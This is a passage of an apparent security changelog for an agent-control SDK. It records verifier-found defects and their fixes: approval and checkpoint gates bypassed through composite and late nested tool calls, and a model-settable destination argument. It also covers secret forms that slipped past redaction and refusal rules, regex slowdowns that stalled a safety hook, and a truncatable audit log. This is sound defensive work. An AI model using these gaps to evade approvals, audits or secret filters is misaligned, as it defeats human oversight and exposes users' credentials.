  header with no end after it matches the rest of the text with no
  `secret` group, which replaces nothing (`_replace_secret` and
  `replaceSecrets` keep such a match). A differential run of the old and
  new patterns on 200,000 to 300,000 random strings over each pattern's
  alphabet found no difference, but one in redaction: the URL rule now
  reads a scheme whose run starts with `_` or a digit before its letter
  (`x_https://u:pw@h`), which the old `\b` skipped, so redaction replaces
  that password too (a superset; the refusal rule already read it).
  Measured after: 1 MB of each adversarial shape in 0.1 to 0.6 s per call
  (`holds_credential`, `redact_text`, `holds_secret`), linear in a fuzz of
  every pattern over pairs of 40 atoms.
- The shell scan (`secret_scan.sh`) uses `grep -E`, which GNU grep runs as
  a DFA: 1 MB of each shape in 0.03 to 0.17 s, so it is unchanged.
- Tests: `tests/test_redaction.py::test_a_long_text_is_read_in_time_in_proportion_to_its_length`
  (twelve 1 MB shapes through `holds_credential`, `redact_text` and
  `holds_secret`, under 20 s; the old patterns ran past 100 s on `eyJ-`) and
  `test_the_patterns_read_a_run_once_and_match_as_before`; the same in
  `packages/acs-core/test/redact.test.ts` (the old patterns held the event
  loop past 110 s); vectors `url_userinfo_scheme_in_a_word` (failed on both
  old redactors), `jwt_after_dash` and `pem_header_without_end` (pins of
  the rewrite) in `tests/conformance/secrets/redact.json`.

#### 30. A composite's approval covered nested calls needing more (medium)

`groundedTool` took a composite's approval policy from its own options, so
bob, holding no role, approved `batch` once and its nested `write_prod`
(`role: admin`, two approvers, 60 s expiry) ran covered; a decision two
hours old covered it; through `outer` likewise. The adapter gave `batch` no
approval policy at all, so one permission prompt ran a binding it can never
allow directly.

- Fix (Standard §5.18.4, a new bullet): a composite's approval covers a
  nested call only as a decision valid for the nested binding's approval
  too, so a composite's call asks for the strictest of its own and,
  transitively, each binding it lists (the most `min_approvers`, the
  shortest `expires`, a `role` one of them sets, its own first); a layer
  that attributes a nested call the composite's decisions do not meet
  checks it as a call of its own.
  - Python (`bindings.py`, `join_approval`): `load_bindings` joins
    `ToolMapping.approval` transitively, through mappings known from
    earlier loads; the adapter's existing rules then refuse a composite
    that reaches two approvers or a role (F502) and apply the shortest
    expiry.
  - TypeScript package (`joinApproval`): `checkBindings`' effective
    `approval` is the same join.
  - Binding: the composite's policy is the join (`POLICY` per tool, a
    record's approval for a plain tool); the nesting token carries the
    request whose decisions approved the composite (its own, or the one
    that covered it), and a nested call is covered only when
    `decisionsCover` finds them valid for its own policy at the call (the
    role the request was asked under, enough distinct approvers counted
    within the shorter expiry). `requestApproval` starts a new round when
    the live request was asked under a weaker policy than the call's (a
    request a host made with `{}`, or one made before the join), so
    decisions given under the weaker one decide nothing.
- Tests: call fixture `composite_takes_invoked_approval` (31 fixtures; one
  approver for a composite whose invoked binding needs two: F502 on both
  layers, both routes of the adapter; failed on both old layers);
  `tests/test_tool_bindings.py::test_a_composite_takes_the_approval_of_its_invokes_transitively`;
  the `checkBindings` join test in `packages/acs-core/test/bindings.test.ts`;
  `test/nesting.test.ts`: the role, approvers and expiry asked of
  `batch` and `outer` (bob's `{}` request refused, bob not allowed to decide
  the joined one, two admins run it covered) and a nested call checked on
  its own (an `ops` composite, and an admin approval lapsed by the nested
  call): 2 failed before.

#### Siblings checked

- Plugin hooks: the pre-tool-use hook gates every Write, Edit, MultiEdit and
  NotebookEdit as `mutate` whatever the persist hook reads; unchanged.
- The audit skill's Edit hook refuses any edit of the records file, so it
  needs no after-the-call scan.
- Python adapter: nested calls are never seen; a composite reaching a send
  under a policy is refused and an unbound invoked name is V107 (batch 3),
  so #27 has no sibling there; #28's profiles are layer-wide already.
- `persistEntry` and the Python memory store scan before their size check
  (the vectors pin `secret_in_data` first); with linear patterns 1 MB takes
  under a second, so the order stays.

#### Documentation

Standard §5.18.4 (the approval bullet); SECURITY.md (§5.4 persist rows and
matcher, the redaction bullet, the class SL paragraph); the binding's
statement (`covers`, `does_not_cover`); the Standard Agents guide (sends and
memory, composites, `profiles`); the SDK guide (a composite's approval);
hooks/README and the persist skill (what the hook scans); the module
docstrings of the redactors, `layer.ts`, `memory.ts`, `grounded.ts` and
`approval.ts`; CHANGELOG (Upgrading: SDK, redaction, plugin persist hook,
`checkBindings`, binding composites and profiles; the fixture count). No
version changes.

#### Checks after batch 5

The batch was finished in a second session (the first was cut off after
changing code): the uncommitted changes were reviewed against the five
defects, the tests were run again on the old hook body, binding sources and
loaders (28 hook cases plus the 2 NotebookEdit matcher cases, and 9 binding
tests, failed), the healthcare profile was run through `memoryTools` on the
real WebAssembly core (persist and recall F502 with `person_required`, both
from the tool's own profiles and the layer's), and the persist row of
SECURITY.md §5.4 now states what the scan does not read.

- Python: `pytest tests/` (5246 passed, 18 skipped); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1896; the
  WebAssembly build reused); the binding's check and test (201, 2 skipped).
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist
  passed); `check-runs.mjs` on `/spec/1.2.0/` and `/guides/claude-agent-sdk/`
  with the 1248 headless shell (CI pins 1254): longest enforced runs 1795
  and 1798 px, in §4.4 and the SDK guide's evidence stores, neither a part
  this batch changed.
- Probes: none left running.

### Batch 6: five reported defects

Security round 1's sixth batch: five defects an independent verifier
reproduced on 99c37dd, four in the Standard Agents binding and one in the
redactors and refusal rule of both SDKs and the plugin's scan. Each was
probed again on cb054f6 (batch 5) before it was fixed: batch 5 had closed
the reported case of #31 (a copy of a profile-gated tool listed in
`invokes` now loads as a plain tool whose nested call the wrapper of the
tool the runtime runs checks on its own, F502/F501; the verifier's cases A
to G and the decorator C all refuse), but not its root: a nested call
needing a checkpoint and no approval, run under a listed name by a tool
other than the one listed, was still covered by a composite that used no
checkpoint. #32 to #35 reproduced as reported. Each fix has tests that fail
on the code before it (run with the old binding sources, redactors, shell
scan and evidence store: 13 binding tests, 5 of them only because their
tool now passes the option's new pointer form; the new call fixture on the
binding; 24 Python and shell tests; 6 TypeScript redaction vectors and 2
binding memory tests; the rest are controls that pass on both).

#### 31. A nested call was covered whatever the composite's call held (medium)

The nesting token named the composite, its approval request and whether a
person approved it, and `check` skipped both gates for the call that took
it. The runtime runs whatever tool it knows under the invoked name, so the
composite's own flags (which include the listed tool's) prove nothing
about the tool that takes the token. On cb054f6: `batch` (`invoke`) lists a
harmless `retrieve` tool under `deploy`, the runtime's `deploy` declares
`requires_checkpoint`, and the nested call ran with no checkpoint, covered
by a call that used none. Batch 5's join made the approval half hold
(`decisionsCover` needs the composite's decisions), not the checkpoint
half.

- Fix (`grounded.ts`): the token carries `checkpoint`, whether the
  composite's call used a checkpoint (its own, or the covering call's,
  transitively); a nested call that needs one is covered only when it did,
  beside the approval and person conditions; otherwise it is checked as a
  call of its own (its own approval request and checkpoint). The claim
  records `checkpointed` for the composite's own nested calls. Plain tools
  listed in `invokes` need no change: their binding is the listed object's,
  which the composite's flags already join, so the composite always held
  what they need.
- Tests (`test/nesting.test.ts`): a nested call that needs a checkpoint,
  under a name the composite lists for a harmless tool, is refused F501
  when the composite used none and, with a checkpoint of its own, runs
  uncovered (failed before); control: the composite that lists the real
  tool needs a checkpoint and covers the call.
- Standard §5.18.4: the composite's approval and checkpoint cover a nested
  call as far as its call held them; a layer whose composite's call did not
  hold what the nested call needs checks it as a call of its own.

#### 32. Header credentials as name/value pairs or tuples were neither redacted nor refused (medium; sibling of round 1 C's structured headers)

A secret member was an object member whose own name ends in a credential
or header name. A HAR's `[{"name": "Authorization", "value": "Basic
..."}]`, a `[["X-Api-Key", "..."]]` tuple and a HAR's `cookies` array
passed both redactors and the refusal rule (persist stored them; the
evidence collector exported them). In text, the header rule needs `:` or
`=` after the name, so the same JSON text passed too.

- Fix (`redaction.py`, `redact.ts`, identically): an object whose `name`,
  `key` or `header` member (any case) holds a secret member's name makes its
  `value` member secret; a two-element array whose first element is one
  makes its second secret; `cookies` joins the member names. Redaction and
  `holds_credential`/`holdsCredential` (the data rule) apply it. A text
  pattern redacts the value after a quoted secret name and `, "value":`, or
  after `[`/`(` and a quoted secret name and a comma (four characters or
  more, after a scheme); the refusal rule takes such a value of 8 or more
  token characters mixing letters and digits, a tuple in text only when it
  closes after two elements (a list of field names is not one). The
  plugin's `hooks/secret_scan.sh` (and its copies in the `persist` and
  `audit` skills) gains the same text rule. Each attempt starts at a quote
  or bracket and reads to the next, so 1 MB of each new shape takes under
  2 s in Python and the shell scan 0.1 s.
- Sibling (Python evidence store): `_sanitize_metadata` turned metadata
  nested deeper than two levels into `str(value)[:100]` before the store
  redacted it, so the pair's repr reached the export, and a cut could keep
  part of a secret (a registered one, or a token cut below its pattern's
  length). Such a value is now its JSON text, redacted with the default
  patterns while its structure can be read, and whole (the 1 KB limit
  replaces a value too large whole; a reference cycle becomes
  `"[unserializable]"`). The delegation anchor's `description` and the
  orchestration anchor's `task_goal` were cut at 100 characters before the
  store redacted them; they are kept whole.
- Tests: vectors `har_header_pairs`, `pair_name_members`, `header_tuples`,
  `har_cookies`, `pair_in_text`, `tuple_in_text` in
  `tests/conformance/secrets/redact.json`, and `pair_member`,
  `tuple_member`, `pair_placeholder`, `pair_other_header`, `pair_in_text`,
  `tuple_in_text`, `name_list_in_text` in `credentials.json` (the text ones
  run through the shell scan under sh and bash);
  `tests/test_memory_store.py` (`header_pair`, `header_tuple`),
  `tests/test_tool_call_approval.py::TestEvidenceToolInput::test_header_pairs_in_the_input_are_redacted`,
  the binding's `test/memory.test.ts` (both forms refused by
  `persistEntry`), and five new 1 MB shapes in the timing tests of both
  SDKs. 24 Python and shell tests and 6 TypeScript vectors failed before.
- Not read (stated in the redactors' docstrings): a pair whose `value`
  comes before its name in text, a flat `[name, value, name, value]` list
  (Node's `rawHeaders`), and a `Cookie:` header line in text.

#### 33. A composite's state issued nesting tokens after its call ended (medium)

`nestingState` returned a proxy whose `invokeTool` minted a token on every
call, with nothing marking the composite's call as over. Code that kept the
state (or another tool it was handed to) invoked a listed tool later in the
execution, and the call was covered by the composite's spent approval and
checkpoint, past the checkpoint's age too; an invocation the composite did
not wait for was covered after its call was recorded complete.

- Fix (`grounded.ts`): a `CompositeScope` (`open`) that `execute` clears in
  a `finally` once the composite's own code settles. An invocation through
  the state after that is refused with F504 and recorded `refused` with no
  `covered_by` (a plain tool it reaches has no wrapper to check it as a
  call of its own); the check is made again after the digest is computed,
  before a token is issued, and before a plain tool's runtime call (a
  `started` entry is then completed `refused`); `findToken` honours a token
  only while its scope is open, so an invocation started in time whose tool
  checks after the composite returned is checked as a call of its own.
- Tests (`test/nesting.test.ts`): a kept state's invocation is refused F504
  without reaching the runtime, recorded with no `covered_by`; an
  invocation the composite did not wait for is checked on its own (F502):
  both failed before. Test (f) of the nesting tokens (no token left once
  the composite returns) still passes.
- Standard §5.18.4: a call made through the composite once its call has
  ended is no nested call; a layer checks it as a call of its own, or
  refuses it (F504).

#### 34. A send tool without the destination option was checked at args.destination (low)

The binding read a `send` tool's destination from `args.destination` when
the tool did not say where. Under a policy, a model could set
`destination` to an allowed value while the tool's code sent to `url`
(with a passthrough or record schema). The record (the annotation)
declared no pointer, and §5.18.1 gives none by default; the Python adapter
refuses such a binding under a policy ("cannot tell where").

- Fix (`grounded.ts`): no default. The `destination` option is an RFC 6901
  pointer (new; stated in the annotation as the record's `destination`,
  and refused at definition when it is not a pointer) or a function. A
  `send` tool defined without it has a destination the layer cannot tell,
  so while any policy is in force every call is refused with F504 before
  approval and the checkpoint. With no policy nothing changes. The call
  fixtures' runner now passes the record's pointer itself.
- Tests: call fixture `send_destination_unknown_under_policy` (32 call
  fixtures: a `post` binding with no destination, called with an allowed
  `destination` argument, F504 on both layers; failed on the old binding,
  passed on the adapter); `test/layer.test.ts` (the verifier's
  `post_webhook` refused and its code not run, the annotation's pointer,
  a non-pointer option throwing).
- Docs: the guide's sends section and the binding README no longer say a
  tool without the option obeys the policy by `args.destination`.

#### 35. The audit hook's own entries were redacted without the host's secrets (medium)

`recordToolCall` wrote its entry for a plain tool's call with the default
patterns only: a host's own secret in the error (`upstream rejected api key
<secret>`) reached the trace, which `actionRecord` exports as an audit
record. Secrets could be registered only per grounded tool.

- Fix: `configureLayer({ secrets })` registers the host's secrets
  layer-wide (`layerSecrets()`); `records.ts` redacts every entry with them
  beside the writer's own, so the audit hook, a control tool, the nesting
  state and every grounded tool use them; a grounded tool's
  `persist`/`audit` refusal and `persistEntry` refuse them too.
  `recordToolCall` takes an optional `{ secrets }`. The secrets are not
  part of `config_sha256` (§6.7: no digest of a secret alone).
- Tests (`test/layer.test.ts`): the hook's entry for `crm_sync` redacted
  with the layer's secrets and with its own, a grounded tool's entry and
  `persistEntry` refusing the layer's secret, and the option's validation:
  3 failed before.
- Python sibling: none; `GroundedAgentConfig.secret_values` already reaches
  the adapter's redactor, its evidence store and the coordination audit log.

#### Siblings checked

- The other `appendTrace` writers (the not-listed refusal, the plain
  path, `controlTool`) now get the layer's secrets through `records.ts`.
- The adapter never sees nested calls (#31, #33 have no Python sibling); it
  already refused a send binding with no destination pointer under a policy
  (#34), which the new fixture now pins for both layers.
- `persistEntry` and the Python memory store use the refusal rule, so #32's
  pair rule reaches both.

#### Documentation

Standard §5.18.4 (the nested-call bullet); SECURITY.md (§1.5 bullets, the
audit hook row of §5.4, the class SL paragraph); the binding's statement
(`covers`: while the composite runs); the Standard Agents guide (secrets,
sends, nesting tokens and the run's end, the `secrets` option, the
guarantees row); the binding README; the persist skill's text; the
redactors' docstrings; CHANGELOG (Upgrading: secrets as pairs, evidence
metadata, the binding's sends, composites and secrets; the fixture count).
No version changes.

#### Checks after batch 6

- Python: `pytest tests/` (5281 passed, 18 skipped); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1917; the WebAssembly
  build reused); the binding's check and test (213, 2 skipped).
- Site: `npm run check`, `npm test` (1173; the new call fixture counts once
  tracked), `npm run build` (check-dist passed); `check-runs.mjs` on
  `/spec/1.2.0/` and `/guides/claude-agent-sdk/` with the 1248 headless
  shell: longest enforced runs 1795 and 1798 px, as before (§5.18.4's
  bullet grew by five lines inside a shorter run).
- Probes (the verifier's, pointed at this worktree): every late invocation
  of `p4_late_invoke` and `p34_variants` (later in the step, an hour later,
  through a helper tool, not awaited) is refused F504 and writes nothing,
  while the composite's own nested call is still covered; `post_webhook` is
  refused F504 with every schema; `v32`'s cases all refuse; the shipped
  audit hook, with the secret registered by `configureLayer({ secrets })`,
  redacts all four phrasings; `redactJson`, `holdsCredential` and
  `redactText` redact and refuse the HAR and tuple forms. None left running.

### Batch 7: five reported defects

Security round 1's seventh batch: five defects an independent verifier
reproduced on 99c37dd, one in the Standard Agents binding's approval
records, three in what the Python SDK and the binding write into records
(§6.7), and one in the time the redactors take and the adapter's hook
matcher. Each was probed again on 69b2d3a (batch 6) before it was fixed.
Two were already closed there: #36 by batch 5's #30 (`requestApproval`
opens a new round when the live request was asked under a weaker policy),
and the regex half of #40 by batch 5's #29 (with batch 1's #9 for
`on_failure="block"`); for both, the verifier's probes now refuse, and the
tests below pin them. #37 to #39 reproduced as reported. Each new test
fails on the code before its fix (run with the old binding source, the old
redactors, audit log, trust module, runner and adapter: 15 Python tests,
4 TypeScript vectors, 2 binding tests; the bounded-time test, run with
99c37dd's redactor, gave no decision within 100 s; the rest are controls
that pass on both).

#### 36. An approval request kept the policy it was made under (medium; closed by batch 5)

On 99c37dd a request a tool made under `approval: {}` was decided by bob,
who holds no role, after the deployment redefined the tool with
`{min_approvers: 2, role: 'admin', expires_ms: 60000}` (thread values
outlive a redeploy), and the new definition's call ran on it; one approved
with no expiry stayed usable a month after an expiry was added. Batch 5's
#30 made `requestApproval` keep a live request only when it was asked under
a policy at least as strict as the call's (`asStrictAs`: as many approvers,
the same role when the call's sets one, an expiry no longer than its own),
and otherwise close it into `history` and open a new round under the call's
policy, so decisions given under the weaker one decide nothing; the call
then counts the new round's decisions against that round's policy, which is
the call's or stricter. The verifier's probe (cases A to D, the
`approvals.post` endpoint included) now refuses each call with F502; bob's
decision is still accepted on the closed round, which no call uses.

- Test (`test/grounded.test.ts`, "decides nothing with a request asked
  under a weaker policy than the tool has at the call"): the pending request
  decided after the change (round 2 opened under the new policy, bob
  refused on it), the approved request a month later (F502, nothing
  executed), and a control (a request asked under a stricter policy stays
  and its admins' decisions run the call). It fails with `asStrictAs`
  removed from `requestApproval`, the code before batch 5.
- Python sibling: none; the adapter keeps no approval request across calls
  (its permission prompt decides one call), and a run's approval policy is
  its catalog's.

#### 37. Evidence anchors kept the digest of content whose secret they redacted (medium)

`Redactor.redact_anchor` replaced a secret in an anchor's `ref`, `excerpt`
or metadata and kept its `digest`; the binding's trace did the same
(`redactJson` over `evidence_anchors`). With `DB_PASSWORD=[REDACTED]\n`
beside the digest of `DB_PASSWORD=sunshine42\n`, 343 guesses recovered the
password; with a registered secret quoted whole, the record held the
digest of the secret alone, which §6.7 forbids outright. The collector
already dropped the digest of a response holding a secret; anchors a host
supplies (a runner `Output`, a grounded tool's output, a direct append)
did not get that rule.

- Fix (`redaction.py`, `redact.ts`, identically): an anchor redaction
  changed keeps no digest of what it cites: its `digest` and its
  metadata's `hash` go, and its metadata says `digest_omitted: "secret"`
  (only when one was dropped). Python: `Redactor.redact_anchor` (both
  evidence stores) and `Redactor.redact_anchor_data`, the same rule on an
  anchor's JSON form; TypeScript: `redactAnchor`, which the binding's
  `redacted()` applies to each anchor of every trace entry (the
  notification and `exportEvidence` read the stored entry). An anchor with
  no secret keeps its digest.
- Tests: six vectors with `anchor: true` in
  `tests/conformance/secrets/redact.json` (an excerpt, a registered secret
  alone, a ref with a metadata `hash`, a secret in metadata only, a secret
  with no digest, and a control), run by both vector runners through
  `redact_anchor`, `redact_anchor_data` and `redactAnchor` (4 failed on both
  old redactors); the binding's `test/evidence.test.ts` ("keeps no digest of
  what an anchor that held a secret cites": the trace, the notification and
  the export; failed on the old `records.ts`). The verifier's `p7_digest.py`
  and `p_alone.py` now find no digest to invert.

#### 38. The coordination audit log redacted only `details` (medium)

`CoordinationAuditLog.record` redacted `details` and kept `intent` and
`evidence_refs` as given, so an `audit` step's event intent (or event type),
an anchor ref shared through `CrossAgentEvidenceBridge` and a delegate's
anchor refs at `complete_task` (an S3 presigned URL's
`X-Amz-Credential=AKIA...`) reached the action record and `to_dict` with
the secret that the same record's `details` held redacted.

- Fix (`coordination/audit.py`): every value an event keeps is redacted
  before the event is kept: `details`, `intent`, each `evidence_refs` item,
  the event type, the agent ids and the capability; the debug log line
  names the redacted values.
- Sibling: `trust.manual_override` (and `TrustModel.manual_override`) built
  an action record from its target, values and anchors and handed it to
  the host's `record` unredacted; it now redacts the record with a
  `redactor` (new optional argument, default patterns), each anchor as a
  store keeps it (`redact_anchor_data`).
- Tests: `tests/test_redaction.py::test_coordination_audit_log_redacts_every_member`
  and `::test_coordination_records_redact_intent_and_evidence_refs` (the
  audit step by intent and by event type, `share_evidence`, `complete_task`
  with a presigned URL; both failed before);
  `tests/test_audit_records.py::test_manual_override_records_no_secret`
  (failed before).

#### 39. The runner redacted only an Error's message (medium)

`WorkflowRunner._redact_error` redacted `message` and passed `reason`
through; the core traces a reason outside the token grammar as
`reason_ignored`, so `HostCannotServe(f"backend {dsn} unreachable")` (its
first argument doubles as the message) left the DSN's password in the
trace and the snapshot beside its redacted copy in the message, as did a
`reason` object. The `Error` the runner built when the run refused a host's
response (`the host's response was refused: <the core's error>`, which
repeats the value refused) was submitted unredacted, so a malformed
`evidence_seen` holding a bearer token reached the trace, the result, the
run record and the snapshot.

- Fix (`runner.py`): `_redact_error` also redacts `reason` (a string as
  text, any other value as JSON; a token is unchanged), and `_submit`, now
  an instance method, passes its fallback `Error` through it.
  `_cannot_serve`'s `Error` goes through `_redact_error` with every other
  response.
- Not changed: the core keeps `reason_ignored` as the host gave it. It
  keeps a host's `message` as given too; §6.7 puts both on the host, and
  the runner, the SDK's host side, now redacts both.
- Test: `tests/test_runner.py::test_no_secret_in_a_failed_step` (free-text
  `HostCannotServe`, a text reason, a reason object, and malformed
  `evidence_seen` as a header and as a URL; the trace, the result, the run
  record and the snapshot): all 5 failed before. The verifier's probe
  finds no leak in any of its nine modes.

#### 40. Quadratic redaction patterns held the adapter's hook past its time limit (medium; closed by batches 1 and 5)

On 99c37dd the URL patterns read a long run again from each position
(`holds_credential` of 256 KB of `a`: 100 s), so the adapter's PreToolUse
check of a TodoWrite (persist) with 290 KB of padding before an AWS key took
64 s, past the SDK's 60 s, and its matcher had no `on_failure`, so the CLI
ran the call. Batch 1's #9 set `on_failure="block"` on the safety matcher
and batch 5's #29 made every pattern read a run once. Measured on this
tree (each under `timeout 120` and a 4 GB limit): Python
`holds_credential` of 1 MB of `a` 0.82 s, of hex 0.66 s, `response_digest`
of 1 MB of `a.` 0.21 s; TypeScript `holdsCredential` and `redactText` of
1 MB 0.02 to 0.07 s; the adapter's hook denies the verifier's TodoWrite
with 290 KB of padding in 0.1 s and 1 MB in 0.4 s.

- Change (`adapter.py`): the safety matcher states its time limit,
  `timeout=SAFETY_HOOK_TIMEOUT_S` (60 s, the SDK's default, so a change of
  the default does not change it), where the SDK's `HookMatcher` has the
  field; the dict form carries it too. No cap on the text a check reads: a
  check that outlived the limit blocks the call (`on_failure="block"`).
- Tests (`tests/test_pretooluse_hooks.py`): the matcher's `timeout` and the
  dict form (both failed on the old adapter), and
  `test_a_long_input_is_decided_well_within_the_time_limit` (the
  verifier's TodoWrite with 1 MB of padding is F504 within 10 s; with
  99c37dd's redactor it gave no decision within 100 s). The 1 MB shapes of
  both redactors' timing tests (batch 5) already cover `a`, hex and `a.`.

#### Siblings checked

- The binding's `args_digest` is of a call's whole arguments, which no
  record holds beside it (§6.7 allows the digest of a whole value); the
  plugin's audit log likewise keeps only `input_sha256`.
- The adapter's call records redact their details; the orchestration and
  delegation anchors go through the store's `redact_anchor`, so #37's rule
  reaches them.
- The binding has no runner; the TypeScript package's `Run.submit` passes
  a host's response to the core as the host gives it (§6.7's duty stays
  the host's).

#### Documentation

SECURITY.md (§1.5: the redaction bullets, the anchor digest rule, the time
limit; the class SL paragraph: the adapter matcher's timeout); the SDK
guide (secrets, the CLIConnectionError note); the runner guide (`reason`
redacted, `reason_ignored`); the Standard Agents guide (secrets); the
`acs-core` README (`redactAnchor`); the redactors', stores' and audit
log's docstrings; CHANGELOG (Upgrading: the adapter's matcher timeout,
anchors that held a secret, coordination records and `manual_override`,
the runner's `reason`, the binding's secrets). The Standard's §6.7 already
forbids each leak; no change there. No version changes.

#### Checks after batch 7

- Python: `pytest tests/` (5296 passed, 18 skipped); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1923; the WebAssembly
  build reused); the binding's check and test (215, 2 skipped).
- Site: `npm run check`, `npm test` (1173).
- Probes (the verifier's, pointed at this worktree, each under `timeout
  120` and an address-space limit): `v37` cases A to D refuse with F502;
  `p7_digest.py`, `p_alone.py`, `probe_anchor.mjs` and `probe_alone.mjs`
  find no digest; the coordination repros find no key in any record; the
  runner probe finds no leak in its nine modes; `p10_hook.py` denies at
  16 KB to 1 MB of padding in at most 0.4 s. None left running.

### Batch 8: three reported defects

Security round 1's eighth and last batch: three defects an independent
verifier reproduced on 99c37dd, one in the redactors and refusal rule of
both SDKs and the plugin's scan, one in the plugin's audit log, and one in
the Standard Agents binding's audit hook. Each was probed again on 8a913da
(batch 7) before it was fixed. Of #41, the header name/value objects and
`[["Cookie", ...]]` pairs in data were already closed by batch 6's #32
(redacted and refused in both SDKs; the verifier's `p1.py` now shows
them so); every other case reproduced as reported, and so did #42. Of #43,
batch 6's #35 had added `configureLayer({ secrets })`, but the
registration the report names, a grounded tool's own `secrets`, still did
not reach the audit hook's entries: the verifier's `probe46` stored the host
key in the hook's entry. Each new test fails on the code before its fix
(run with the old redactors, shell scan and skill copies: 64 Python and
shell tests and 34 TypeScript vector tests; with the old redactor: the 3
new runner cases; with the old log hook,
verifier and pre-tool-use hook: 7 head tests and 3 guard cases; with the
old binding: 2 tests; the pinned-forms tests call a function the old code
does not have).

#### 41. Common credential forms passed the redactors and the refusal rule (medium)

Unchanged by both redactors and not refused by `holds_credential`,
`holdsCredential` or `secret_in` (identical results): a URL's userinfo with
an empty user's name (`redis://:<password>@`, Redis's form; the user part
was `[^/:@]+`), an assignment in escaped JSON text (`curl -d
"{\"password\": \"...\"}"`, an AWS `SecretString`; only `["']?` was read
around the name), `curl -u user:<password>` (also as an exception's
`['false', '-u', 'admin:...']`), `SECRET_KEY=`, `DJANGO_SECRET_KEY=`,
`{"secret_key": ...}` and `{"passphrase": ...}`, and a registered value
percent-encoded or JSON-escaped (only the verbatim form was replaced). End
to end, `WorkflowRunner` kept the password in the message and the trace for
the empty-user URL, the `CalledProcessError` text and the escaped JSON.

- Fix (`redaction.py`, `redact.ts`, `hooks/secret_scan.sh` and its copies
  in the `persist` and `audit` skills, identically):
  - the userinfo rule takes an empty user's name (`[^/:@]*`);
  - a quote around a credential name or value may be escaped (`\\*["']`),
    in the assignment, `Authorization`, pair and tuple rules of redaction
    and refusal; a value ends at an escaped quote, so the escapes around
    the marker stay (a value character is not a backslash, or is a run of
    backslashes no quote follows, read once);
  - new rules for a command's user option (`-u`, `-U`, `--user`,
    `--proxy-user`; the value after blanks, `=`, attached to `-u`, or as a
    list's next item) and for an option named for a credential with its
    value after blanks or as a list's next item (`--password <value>`, not
    a value that starts with `-`). Redaction replaces the password or value
    (4 characters or more); the refusal rule takes a user option's password
    of 8 or more characters mixing letters and digits (so `docker run -u
    1000:1000` passes) and a credential option's value as an assignment's
    (quoted, 8 or more; unquoted, 12 or more mixing letters and digits);
  - `passphrase` and `secret[_-]?key` join the credential names (text and
    JSON members);
  - a registered value is registered in the forms text carries it in:
    `encoded_forms` / `encodedForms` (new, exported) give, in one order, the
    value, its JSON-escaped forms (non-ASCII as it is and as `\uXXXX`, each
    with `/` as `\/`, and the first two escaped again) and its
    percent-encoded forms (UTF-8; RFC 3986's unreserved characters kept,
    with `/` too, with `!*'()` too as `encodeURIComponent` keeps them, and
    the two form-body encodings with `+` for a space; upper- then lower-case
    hex). `Redactor.add_secret` and the package's `registered` add them all;
    replacement and refusal then see them as they see the value.
- Sibling: the runner, the evidence stores, the coordination audit log, the
  adapter and the binding's trace and memory all redact and refuse through
  these redactors, so they take each change; `GroundedAgentConfig.
  secret_values` and the binding's `secrets` register the encoded forms.
- Not read, stated in both redactors' docstrings and SECURITY.md: a
  password attached to a short option with no name (`mysql -p<secret>`;
  `-p` means too much else) and a secret in base64 or another encoding
  unless the host registers that form.
- Tests: 13 vectors in `tests/conformance/secrets/redact.json` (empty-user
  URL, escaped JSON once and twice, an escaped `Authorization` header and
  pair, user options, a user option as list items, a credential option,
  one before another option and options that take no password as
  controls, `SECRET_KEY` and `passphrase` in text and as members, encoded
  and non-ASCII registered values) and 17 in `credentials.json` (with
  controls: an empty-user placeholder, `docker run -u 1000:1000` and `git
  push -u`, credential options in prose, `secret_key: see the vault`), run
  by Python, the TypeScript package and the shell scan under sh and bash;
  `tests/test_runner.py::test_no_secret_in_a_failed_step` gains the three
  end-to-end cases; the pinned forms in `tests/test_redaction.py` and
  `test/redact.test.ts` (each checks the standard library's or the
  platform's encoders' output is among them, and that it is redacted and
  refused); 11 new 1 MB shapes in both timing tests (backslash runs,
  escaped pairs and tuples, `a://:`, `-u`, `'-u', '`, `-ua:`, `--a-`,
  `--password`). Measured: Python at most 2.1 s at 1 MB, TypeScript 0.3 s,
  the shell scan 0.2 s.
- Parity: 4000 fuzzed strings over the new tokens give the same redaction,
  pointers and refusal in Python and TypeScript (0 differences), and 1094
  single-line ones the same refusal in Python and the shell scan under bash
  and sh.

#### 42. The audit log's chain did not show its last entries removed (low)

`tools/verify_audit_log.py` checked each entry and its link to the one
before; nothing anchored the end, so `head -n 2` of a three-line log
verified (2/2), as did a log whose last line was deleted and to which the
hook then chained the next call, or a log removed and begun again. The
hook's comment claimed that deleting any entry invalidates all later HMACs.

- Fix: the log hook keeps the chain's end in `.claude/audit.head`, one line
  of JSON: `entries` (the log's line count), `hmac` (the last line's) and
  `head_hmac`, the HMAC of `acs-audit-head:<entries>:<hmac>` under the
  log's key. Under the log's lock, before it appends, it checks that the
  log still holds the head's entry at its place; after it appends, it
  writes the head for the log's end as it then is (to a file it creates
  with noclobber, renamed over the old one). A log that no longer holds the
  head's entry, or a head another key signed, is reported (exit 1, the
  line still written) and the head is kept: it is the evidence of the cut,
  at every later call, until a person moves both files aside. A log with no
  head (begun before the hook kept one) is anchored from that line on,
  reported once. A head behind the log (a run that appended and could not
  write it) still anchors it. The verifier reads the head beside the log
  (`<log>.head`; `--head-file` names another) and fails a log that ends
  before it, holds another entry at its place, or has no head (`--no-head`
  checks the chain alone: a log begun before the head, and the audit
  skill's `records.jsonl`). `verify_log` takes the head as an optional
  argument. The pre-tool-use hook's records guard refuses a call that names
  `audit.head` (F504), as it refuses one naming the checkpoint records.
  The comment, hooks/README.md, SECURITY.md §5 and the audit skill's
  verifier command (`--no-head`) say what the chain and the head show.
- Not changed: with the default key, derived from the host name, the chain
  and the head show accidental damage only (stated, as before);
  removing both files with a call a person approved, or a process outside
